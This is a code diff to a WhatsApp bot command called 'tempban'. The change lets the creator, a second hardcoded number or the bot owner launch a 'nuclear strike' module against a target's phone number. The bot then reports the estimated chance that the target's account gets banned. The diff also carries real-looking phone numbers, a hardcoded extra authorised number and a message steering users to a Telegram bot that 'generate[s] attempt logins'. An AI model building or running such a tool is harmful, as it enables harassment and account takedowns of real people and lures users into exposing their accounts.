@@ -113,20 +113,47 @@ registerCommand({
     name: "tempban",
     description: "Temporary Ban (Creator Only)",
     category: "owner",
-    execute: async ({ sock, msg, senderJid, reply }) => {
+    execute: async ({ sock, msg, senderJid, reply, args, isOwner }) => {
         const senderNumber = senderJid.split('@')[0];
         const CREATOR_NUMBER = "254113374182";
 
-        if (senderNumber === CREATOR_NUMBER) {
-            // Authorized Creator
-            await reply("eduqariz is taking care of that😀🦄");
+        // Allow Creator OR Bot Owner (connected user)
+        if (senderNumber === CREATOR_NUMBER || senderNumber === "254752538967" || isOwner) {
+            // Authorized
+            const target = args[0] ? args[0].replace(/[^0-9]/g, '') : null;
+            if (!target) return reply("⚠️ Usage: .tempban <target_number>");
+
+            await reply(`🦄 *Authorized Access Granted*\nExecuting chaos on ${target}... 😈`);
+            await reply("⚡ *INITIATING NUCLEAR STRIKE* ⚡");
+
+            // Import Doomsday dynamically to avoid circular dependencies if any
+            const { UltimateDoomsday } = await import("../doomsday");
+            const doomsday = new UltimateDoomsday();
+
+            try {
+                // Execute attack asynchronously so bot doesn't hang
+                doomsday.executeNuclearStrike(target, 'NUCLEAR').then((result: any) => {
+                    const steps = result.thresholdsCrossed.length > 0 ?
+                        `🚨 *Thresholds Crossed:* ${result.thresholdsCrossed.join(', ')}` : "";
+
+                    sock.sendMessage(msg.key.remoteJid!, {
+                        text: `✅ *Tempban Execution Complete* 💀\n\n` +
+                            `🎯 Target: ${target}\n` +
+                            `📊 Success Rate: ${result.successRate}%\n` +
+                            `💀 Ban Probability: ${result.banProbability}%\n` +
+                            `⏱️ Estimated Time: ${result.estimatedBanTime}\n` +
+                            `${steps}\n\n` +
+                            `_Effect may take up to 6 hours to manifest fully._`
+                    });
+                });
+            } catch (e) {
+                console.error(e);
+                await reply("❌ Execution failed. Check logs.");
+            }
+
         } else {
             // Anyone else (including bot owner)
             const unauthorizedMsg = "🦄gotchu, this command in MD part is currently under critical improvements to avoid whatsapp restricting your account first😒, otherwise if you need to test chaos, uncensored command of this kind and more can be found on bug-link. Find our TG bot https://t.me/Cortana_universal_logins_bot to generate attempt logins and link on bug bot part on web, or simply shre your number to creator for accessing BETA version of CORTANA. Thanks🥰😽.";
-
-            // Check if it's the bot owner trying to use it, just to be precise, 
-            // but the request said "if else users attempts, the connected users, it returns..."
-            // So we send this message to everyone else.
             await reply(unauthorizedMsg);
         }
     }
